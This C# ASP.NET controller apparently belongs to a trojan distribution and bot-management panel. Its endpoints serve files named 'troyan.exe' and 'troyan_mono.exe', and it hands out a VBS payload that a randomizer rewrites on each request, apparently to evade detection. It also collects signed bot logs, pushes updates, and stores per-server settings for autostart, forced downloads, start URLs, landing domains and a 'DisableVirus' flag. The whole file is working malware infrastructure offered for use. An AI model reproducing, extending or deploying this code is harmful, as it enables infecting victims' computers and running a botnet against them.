using System.Text;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Caching.Memory;
using model;

namespace cp.Controllers;

[Route("")]
public class CpController : BaseController
{
    private readonly IServiceProvider _serviceProvider;
    private readonly BotController _botController;
    public CpController(ServerService serverService, BotController botController, IServiceProvider serviceProvider, IConfiguration configuration, IMemoryCache memoryCache): base(serverService, configuration, memoryCache)
    {
        _serviceProvider = serviceProvider;
        _botController = botController;
    }
    
    [Authorize(Policy = "AllowFromIpRange")]
    [HttpGet]
    public IActionResult Index()
    {
        var server = Server;
        if (server == "favicon.ico")
            return NotFound();
        try
        {
            var serverResult = _serverService.GetServer(server, false);
            ViewData["UrlDoc"] = serverResult.ServerModel.UrlDoc;
            return View("Index", serverResult.ServerModel);
        }
        catch (Exception e)
        {
            return View("Index", new ServerModel() {Server = server, Result = e.Message + "\r\n" + e.StackTrace });
        }
    }
    
    [HttpGet("/GetIcon")]
    public IActionResult GetIcon()
    {
        try
        {
            var server = Server;
            if (!System.IO.File.Exists(_serverService.GetIcon(server)))
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetIcon(server));
            Response.Headers.Add("Content-Type", "image/x-icon");
            return File(fileBytes, "image/x-icon");
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }

    protected IActionResult GetFile(string serverFile, string fileName)
    {
        try
        {
            if (!System.IO.File.Exists(serverFile))
                return NotFound();
            var fileBytes = System.IO.File.ReadAllBytes(serverFile);
            Response.Headers.Add("Content-Type", "application/octet-stream");
            return File(fileBytes, "application/octet-stream", fileName.Split(".")[0] + "_" + System.Environment.TickCount.ToString() + "." + fileName.Split(".")[1] );
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }

    [HttpGet("/GetExe")]
    public IActionResult GetExe()
    {
        return GetFile(_serverService.GetExe(Server), "troyan.exe");
    }
    
    [HttpGet("/GetExeMono")]
    public IActionResult GetExeMono()
    {
        return GetFile(_serverService.GetExeMono(Server), "troyan_mono.exe");
    }
    
    private async Task<IActionResult> GetFileAdvanced(string file, string name, string random, string target, string randomMethod, string nofile)
    {
        try
        {
            string fileContent;
            if (!_memoryCache.TryGetValue(file, out fileContent))
            {
                fileContent = await VbsRandomer.ReadFileWithRetryAsync($@"C:\data\{Server}\{file}", 2, 50);
                var cacheEntryOptions = new MemoryCacheEntryOptions()
                    .SetSlidingExpiration(TimeSpan.FromMinutes(1));
                _memoryCache.Set(file, fileContent, cacheEntryOptions);
            }
            if (randomMethod == "vbs")
                fileContent = VbsRandomer.Modify(fileContent);
            var fileBytes = Encoding.UTF8.GetBytes(fileContent);
            Response.Headers.Add("Content-Type", "text/plain");
            if (nofile == "nofile")
                return Ok(fileContent);
            return File(fileBytes, "text/plain", name.Split(".")[0] + "_" + System.Environment.TickCount.ToString() + "." + name.Split(".")[1] );
        }
        catch (Exception)
        {
            return StatusCode(500, "Internal server error");
        }
    }
    
    [HttpGet("/{profile}/{random}/{target}/GetVbs")]
    public async Task<IActionResult> GetVbs(string profile, string random, string target)
    {
        var ipAddress = IpAddress;
        if (string.IsNullOrWhiteSpace(ipAddress))
            return BadRequest("IP address not found.");
        if (string.IsNullOrWhiteSpace(Server))
            return BadRequest("Server address not found.");
        
        return await GetFileAdvanced("troyan.c.vbs", "fun.vbs", random, target, "vbs", "");
    }
        
    [HttpGet("/{profile}/GetVbsPhp")]
    public async Task<IActionResult> GetVbsPhp(string profile)
    {
        return await GetFileAdvanced("dn.php", "dn.php", "", "", "","nofile");
    }
    
    [HttpPost]
    [Authorize(Policy = "AllowFromIpRange")]
    public IActionResult IndexWithServer(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
    {
        var server = Server;
        try
        {
            var existingModel = _serverService.GetServer(server, true).ServerModel;
            if (existingModel == null)
            {
                return NotFound();
            }

            if (action == "reboot")
            {
                var res = _serverService.Reboot();
                return View("Index", new ServerModel() { Server = server, Result = res });
            }
            
            if (action == "clearstats")
            {
                _serviceProvider.GetRequiredService<StatsController>().ClearStats();
                return View("Index", existingModel);
            }

            //embeddingss
            if (newEmbeddings != null && newEmbeddings.Count > 0)
            {
                foreach (var file in newEmbeddings)
                {
                    var filePath = _serverService.GetEmbedding(server, file.FileName);
                    if (!Directory.Exists(_serverService.EmbeddingsDir(server)))
                        Directory.CreateDirectory(_serverService.EmbeddingsDir(server));
                    using (var stream = new FileStream(filePath, FileMode.Create))
                    {
                        file.CopyTo(stream);
                    }

                    updatedModel.Embeddings.Add(file.FileName);
                }
            }

            var toDeleteEmbeddings = existingModel.Embeddings.Where(a => !updatedModel.Embeddings.Contains(a));
            foreach (var file in toDeleteEmbeddings)
                _serverService.DeleteEmbedding(server, file);

            //front
            if (newFront != null && newFront.Count > 0)
            {
                foreach (var file in newFront)
                {
                    var filePath = _serverService.GetFront(server, file.FileName);
                    if (!Directory.Exists(_serverService.FrontDir(server)))
                        Directory.CreateDirectory(_serverService.FrontDir(server));
                    using (var stream = new FileStream(filePath, FileMode.Create))
                    {
                        file.CopyTo(stream);
                    }

                    updatedModel.Front.Add(file.FileName);
                }
            }

            var toDeleteFront = existingModel.Front.Where(a => !updatedModel.Front.Contains(a));
            foreach (var file in toDeleteFront)
                _serverService.DeleteFront(server, file);

            //icon
            if (iconFile != null && iconFile.Length > 0)
            {
                var filePath = _serverService.GetIcon(server);

                using (var stream = new FileStream(filePath, FileMode.Create))
                {
                    iconFile.CopyTo(stream);
                }
            }

            updatedModel.Pushes = updatedModel.Pushes
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
            
            updatedModel.StartUrls = updatedModel.StartUrls
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();
            
            updatedModel.StartDownloads= updatedModel.StartDownloads
                .Where(a => !string.IsNullOrEmpty(a))
                .SelectMany(a => a.Split(Environment.NewLine))
                .Where(a => !string.IsNullOrEmpty(a))
                .Select(a => a.Trim()).Where(a => !string.IsNullOrEmpty(a)).ToList();

            //model
            existingModel.UrlDoc = updatedModel.UrlDoc;
            existingModel.Server = server;
            existingModel.Alias = updatedModel.Alias;
            existingModel.StrahServer = updatedModel.StrahServer;
            existingModel.Login = updatedModel.Login;
            existingModel.Password = updatedModel.Password;
            existingModel.Track = updatedModel.Track;
            existingModel.TrackSerie = updatedModel.TrackSerie;
            existingModel.TrackDesktop = updatedModel.TrackDesktop;
            existingModel.AutoStart = updatedModel.AutoStart;
            existingModel.AutoUpdate = updatedModel.AutoUpdate;
            existingModel.PushesForce = updatedModel.PushesForce;
            existingModel.Pushes = updatedModel.Pushes;
            existingModel.StartUrlsForce = updatedModel.StartUrlsForce;
            existingModel.StartUrls = updatedModel.StartUrls;
            existingModel.StartDownloadsForce = updatedModel.StartDownloadsForce;
            existingModel.StartDownloads = updatedModel.StartDownloads;
            existingModel.FrontForce = updatedModel.FrontForce;
            existingModel.Front = updatedModel.Front;
            existingModel.ExtractIconFromFront = updatedModel.ExtractIconFromFront;
            existingModel.EmbeddingsForce = updatedModel.EmbeddingsForce;
            existingModel.Embeddings = updatedModel.Embeddings;
            existingModel.Domains = updatedModel.IpDomains.Values.ToList();
            existingModel.LandingFtp = updatedModel.LandingFtp;
            existingModel.LandingAuto = updatedModel.LandingAuto;
            existingModel.LandingName = updatedModel.LandingName;

            
            existingModel.Bux = updatedModel.Bux;
            existingModel.DnSponsor = updatedModel.DnSponsor;
            existingModel.DisableVirus = updatedModel.DisableVirus;
            
            if (!ContainsUniqueValues(existingModel.Domains))
            {
                return View("Index", new ServerModel() {Server = server, Result = "Домены должны быть уникальными" });
            }

            //service
            var result = _serverService.PostServer(server, existingModel, action, "kill");

            existingModel.Result = result;
            return View("Index", existingModel);
        }
        catch (Exception e)
        {
            return View("Index", new ServerModel() {Server = server, Result = e.Message + "\r\n" + e.StackTrace });
        }
    }

    private static bool ContainsUniqueValues(List<string> strings)
    {
        HashSet<string> uniqueStrings = new HashSet<string>();

        foreach (var str in strings)
        {
            if (!uniqueStrings.Add(str))
            {
                // If Add returns false, the string was already in the HashSet
                return false;
            }
        }
        return true;
    }

    #region BOT
    [HttpGet("/{profile}/{random}/{target}/DnLog")]
    public async Task<IActionResult> DnLog(string profile, string random, string target)
    {
        return await _botController.DnLog(profile, random, target);
    }
    
    [HttpPost("/upsert")]
    [Consumes("application/json")]
    [Produces("application/json")]
    public async Task<IActionResult> UpsertBotLog([FromHeader(Name = "X-Signature")] string xSignature, [FromBody] BotLogRequest request)
    {
        return await _botController.UpsertBotLog(Server,IpAddress, xSignature, request);
    }

    [HttpGet("/update")]
    public IActionResult Update()
    {
        return _botController.Update(Server);
    }
    #endregion
}